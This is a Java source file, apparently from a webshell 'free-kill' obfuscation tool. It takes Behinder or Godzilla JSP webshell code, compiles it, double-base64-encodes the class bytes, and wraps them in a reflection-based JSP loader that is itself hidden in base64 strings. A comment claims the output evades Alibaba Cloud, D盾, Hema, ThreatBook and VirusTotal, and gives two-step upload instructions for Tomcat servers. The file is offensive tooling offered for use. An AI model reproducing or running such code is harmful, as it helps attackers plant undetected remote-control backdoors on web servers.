package encode;

import application.RandomString;
import config.Demos;
import org.apache.jasper.JspC;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class JspEncodeDemo7 {
    String tamplate;
    String key;
    String sourcecode;
    String encode;
    String demotxt;
    static  String Mclass = new String(Base64.getDecoder().decode("PCUhcHVibGljIHN0YXRpYyBjbGFzcyBNIHsKICAgICAgICBNKCl7fQogICAgICAgIHB1YmxpYyBzdGF0aWMgamF2YS51dGlsLk1hcDxTdHJpbmcsT2JqZWN0PiBnZXRtZXRob2QgKCkgdGhyb3dzIEV4Y2VwdGlvbiB7CiAgICAgICAgICAgIGphdmEudXRpbC5IYXNoTWFwPFN0cmluZywgT2JqZWN0PiBtYXAgPSBuZXcgamF2YS51dGlsLkhhc2hNYXA8U3RyaW5nLCBPYmplY3Q+KCk7CiAgICAgICAgICAgIGphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZCBkZWZpbmVDbGFzcyA9IENsYXNzTG9hZGVyLmNsYXNzLmdldERlY2xhcmVkTWV0aG9kKCJkZWZpbiIrImVDbGFzcyIsIFN0cmluZy5jbGFzcywgYnl0ZVtdLmNsYXNzLCBpbnQuY2xhc3MsIGludC5jbGFzcyk7bWFwLnB1dCgiZGVmaW5lQ2xhc3MiLGRlZmluZUNsYXNzKTsKICAgICAgICAgICAgamF2YS5sYW5nLnJlZmxlY3QuTWV0aG9kIHNldEFjY2Vzc2libGUgPSBqYXZhLmxhbmcucmVmbGVjdC5BY2Nlc3NpYmxlT2JqZWN0LmNsYXNzLmdldE1ldGhvZCgic2V0QWNjIisiZXNzaWJsZSIsIGJvb2xlYW4uY2xhc3MpO21hcC5wdXQoInNldEFjY2Vzc2libGUiLHNldEFjY2Vzc2libGUpOwogICAgICAgICAgICBqYXZhLmxhbmcucmVmbGVjdC5NZXRob2QgbG9hZENsYXNzID0gQ2xhc3NMb2FkZXIuY2xhc3MuZ2V0RGVjbGFyZWRNZXRob2QoImxvYWQiKyJDbGFzcyIsIFN0cmluZy5jbGFzcyk7bWFwLnB1dCgibG9hZENsYXNzIixsb2FkQ2xhc3MpOwogICAgICAgICAgICByZXR1cm4gbWFwO319JT4="));

    public JspEncodeDemo7() {
    }

    public JspEncodeDemo7(String tamplate, String key, String code) {
        this.tamplate = tamplate;
        this.key = key;
        this.sourcecode = code;
    }

    public static String GetDemotxt(){

        return Mclass+
                "\n/*\n" +
                " * By: XG小刚\n" +
                " * Time: 2023-12-01_jspdemo7\n" +
                " * Bypass: 阿里云恶意文件检测平台、阿里云主机病毒查杀、河马在线、河马本地(1.8.2)、D盾(2.1.7)、微步(安全)、VT(0红)\n" +
                " * 适配: tomcat7.0.x、tomcat8.x、tomcat9.0.x、tomcat10.0.x、tomcat10.1.x(需将pom.xml中版本替换)\n" +
                " * java8 <= java版本 <= java21\n" +
                " * 需要先单独上传上面jsp文件,将上传后jsp文件名替换免杀马中XXXXXX位置，再上传免杀马\n"+
                " */";
    }

    public String[] Run() throws Exception {

        if(!sourcecode.isEmpty()){
            try {
                if(this.key.equals("默认随机")){
                    this.key = "y"+RandomString.getRString(5);
                }

                String filename = this.key+".jsp";
                File file = new File("./cache/");
                file.mkdir();
                FileOutputStream fileOutputStream = new FileOutputStream("./cache/"+filename);
                this.sourcecode = this.sourcecode.replace("new sun.misc.BASE64Decoder().decodeBuffer","java.util.Base64.getDecoder().decode");
                fileOutputStream.write(this.sourcecode.getBytes(StandardCharsets.UTF_8));

                JspC jspc = new JspC();
                jspc.setUriroot("./cache/");
                jspc.setOutputDir("./cache/");
                jspc.setJspFiles(filename);
                jspc.setCompile(true);
                jspc.execute();

                File filepath = new File("./cache/org/apache/jsp/");
                File[] files = filepath.listFiles();
                String base64String = "";
                String cloader = "";
                for (File f : files) {
                    if (f.getName().contains(".class")) {
                        FileInputStream fileInputStream = new FileInputStream(f.getPath());
                        byte[] buffer = new byte[(int) f.length()];
                        fileInputStream.read(buffer);
                        String s = Base64.getEncoder().encodeToString(buffer);
                        s = "dqqaaeCaasssaaAccessbbaa"+s;
                        s = Base64.getEncoder().encodeToString(s.getBytes(StandardCharsets.UTF_8));
                        String[] split = f.getName().split("\\.");
                        String base64stringreplace = "U3RyaW5nICRjbGFzc25hbWUkID0gIiRjbGFzc2Jhc2U2NCQiOwpieXRlW10gY2xhc3NCeXRlc18kY2xhc3NuYW1lJCA9IEJhc2U2NC5nZXREZWNvZGVyKCkuZGVjb2RlKCRjbGFzc25hbWUkKTsKJGNsYXNzbmFtZSQgPSBuZXcgU3RyaW5nKGNsYXNzQnl0ZXNfJGNsYXNzbmFtZSQpOwpjbGFzc0J5dGVzXyRjbGFzc25hbWUkID0gQmFzZTY0LmdldERlY29kZXIoKS5kZWNvZGUoJGNsYXNzbmFtZSQuc3Vic3RyaW5nKDI0KSk7Cg==";
                        String sourcestringreplace = new String(Base64.getDecoder().decode(base64stringreplace));
                        sourcestringreplace = sourcestringreplace.replace("$classname$",split[0]);
                        sourcestringreplace = sourcestringreplace.replace("$classbase64$",s);
                        base64String +=sourcestringreplace;

                        String base64cloaderrep = "ZGVmaW5lQ2xhc3MuaW52b2tlKGFwcGxpY2F0aW9uLmdldENsYXNzTG9hZGVyKCksICJvcmcuYXBhY2hlLmpzcC4kY2xhc3NuYW1lJCIsIGNsYXNzQnl0ZXNfJGNsYXNzbmFtZSQsIDAsIGNsYXNzQnl0ZXNfJGNsYXNzbmFtZSQubGVuZ3RoKTsK";
                        String sourcebase64cloaderrep = new String(Base64.getDecoder().decode(base64cloaderrep));
                        sourcebase64cloaderrep = sourcebase64cloaderrep.replace("$classname$",split[0]);
                        cloader +=sourcebase64cloaderrep;
                    }
                }
                String demo = "PCVAIHBhZ2UgcGFnZUVuY29kaW5nPSJVVEYtOCIgJT4KPCVAIHBhZ2UgaW1wb3J0PSJqYXZhLnV0aWwuKiIgJT4KPCVAIHBhZ2UgaW1wb3J0PSJqYXZhLmxhbmcucmVmbGVjdC4qIiAlPgo8JUAgcGFnZSBpbXBvcnQ9Im9yZy5hcGFjaGUuamFzcGVyLnJ1bnRpbWUuSHR0cEpzcEJhc2UiICU+CjwlQCBpbmNsdWRlIGZpbGU9IlhYWFhYWC5qc3AiJT4KPCUKICAgICRiYXNlNjRTdHJpbmckCiAgICBNZXRob2QgZGVmaW5lQ2xhc3MgPSAoTWV0aG9kKU0uZ2V0bWV0aG9kKCkuZ2V0KCJkZWZpIisibmVDbGFzcyIpOwogICAgTWV0aG9kIHNldEFjY2Vzc2libGUgPSAoTWV0aG9kKU0uZ2V0bWV0aG9kKCkuZ2V0KCJzZXRBIisiY2Nlc3NpYmxlIik7CiAgICBNZXRob2QgbG9hZENsYXNzID0gKE1ldGhvZClNLmdldG1ldGhvZCgpLmdldCgibG9hZEMiKyJsYXNzIik7CiAgICBzZXRBY2Nlc3NpYmxlLmludm9rZShkZWZpbmVDbGFzcyx0cnVlKTsKICAgIENsYXNzIGFDbGFzcyA9IG51bGw7CiAgICB0cnkgewogICAgICAgICRjbG9hZGVyJAogICAgfWNhdGNoIChFeGNlcHRpb24gZXhjZXB0aW9uKXsKICAgICAgICBhQ2xhc3MgPSAoQ2xhc3MpIGxvYWRDbGFzcy5pbnZva2UoYXBwbGljYXRpb24uZ2V0Q2xhc3NMb2FkZXIoKSwgIm9yZy5hcGFjaGUuanNwLiRjbGFzc25hbWUkIik7CiAgICB9CiAgICBIdHRwSnNwQmFzZSBodHRwSnNwQmFzZSA9IChIdHRwSnNwQmFzZSkgYUNsYXNzLi8qdGVzdCovCiAgICAgICBuZXdJbnN0YW5jZSgpOwogICAgaHR0cEpzcEJhc2UuaW5pdChwYWdlQ29udGV4dC5nZXRTZXJ2bGV0Q29uZmlnKCkpOwogICAgaHR0cEpzcEJhc2Uuc2VydmljZShyZXF1ZXN0LCByZXNwb25zZSk7CiU+";
                if(Demos.jspdemo7!=null){
                    demo = Demos.jspdemo7;
                }
                encode = new String(Base64.getDecoder().decode(demo));
                encode = encode.replace("$classname$",this.key+"_jsp");
                encode = encode.replace("$base64String$",base64String);
                encode = encode.replace("$cloader$",cloader);


                deleteDir("./cache/");

                return new String[]{this.encode,""};
            }catch (Exception e){
                deleteDir("./cache/");
                return new String[]{"加密失败",""};

            }
        }else {
            return new String[]{"请输入冰蝎、哥斯拉JSP源码",""};
        }
    }

    public static void deleteDir(String path) {
        File file = new File(path);
        File[] list = file.listFiles();
        for (File f : list) {
            if (f.isDirectory()) {
                deleteDir(f.getPath());
            } else {
                f.delete();
            }
        }
        file.delete();
    }
}
